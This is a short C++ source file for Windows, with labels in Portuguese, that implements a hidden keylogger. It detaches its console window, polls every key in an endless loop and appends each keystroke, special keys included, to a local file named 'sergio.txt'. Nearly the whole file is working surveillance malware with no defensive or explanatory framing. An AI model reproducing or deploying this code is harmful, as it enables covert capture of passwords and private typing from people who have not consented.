#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>

void loga(int k)
{
	std::ofstream pao;
	pao.open("sergio.txt", std::fstream::app);
	switch (k)
	{
	case VK_ESCAPE:
		pao << "*ESC*";
		break;
	case VK_RETURN:
		pao << "*ENTER*";
		break;
	case VK_BACK:
		pao << "*BACKSPACE*";
		break;
	case VK_SHIFT:
		pao << "*SHIFT*";
		break;
	case VK_NUMPAD0:
		pao << "0";
		break;
	case VK_NUMPAD1:
		pao << "1";
		break;
	case VK_NUMPAD2:
		pao << "2";
		break;
	case VK_NUMPAD3:
		pao << "3";
		break;
	case VK_NUMPAD4:
		pao << "4";
		break;
	case VK_NUMPAD5:
		pao << "5";
		break;
	case VK_NUMPAD6:
		pao << "6";
		break;
	case VK_NUMPAD7:
		pao << "7";
		break;
	case VK_NUMPAD8:
		pao << "8";
		break;
	case VK_NUMPAD9:
		pao << "9";
		break;
	case VK_CAPITAL:
		pao << "*CAPSLOCK*";
		break;
	case VK_DELETE:
		pao << "*DELETE*";
		break;
	case VK_SPACE:
		pao << "*ESPAÇO*";
		break;
	case VK_TAB:
		pao << "*TAB*";
		break;
	case VK_MENU:
		pao << "*ALT*";
		break;
	case VK_LWIN:
		pao << "*TECLA WINDOWS*";
		break;
	case VK_MULTIPLY:
		pao << "*MULTIPLICAÇÃO DA CALCULADORA*";
		break;
	case VK_ADD:
		pao << "*ADIÇÃO DA CALCULADORA*";
		break;
	case VK_SEPARATOR:
		pao << "*SEPARADOR*";
		break;
	case VK_DECIMAL:
		pao << "*VIRGULA*";
		break;
	case VK_F1:
		pao << "*F1*";
		break;
	case VK_F2:
		pao << "*F2*";
		break;
	case VK_F3:
		pao << "*F3*";
		break;
	case VK_F4:
		pao << "*F4*";
		break;
	case VK_F5:
		pao << "*F5*";
		break;
	case VK_F6:
		pao << "*F6*";
		break;
	case VK_F7:
		pao << "*F7*";
		break;
	case VK_F8:
		pao << "*F8*";
		break;
	case VK_F9:
		pao << "*F9*";
		break;
	case VK_F10:
		pao << "*F10*";
		break;
	case VK_F11:
		pao << "*F11*";
		break;
	case VK_F12:
		pao << "*F12*";
		break;

		default:	pao << (char)k;
	}
	pao << "\n";
	pao.close();
}


int CALLBACK WinMain(
	HINSTANCE   hInstance,
	HINSTANCE   hPrevInstance,
	LPSTR       lpCmdLine,
	int         nCmdShow)
{
	FreeConsole();
	while(true)
	{
		for(int k=8;k<190;k++)
			if (GetAsyncKeyState(k))
			{
				loga(k);
			}
		Sleep(100);
	}
}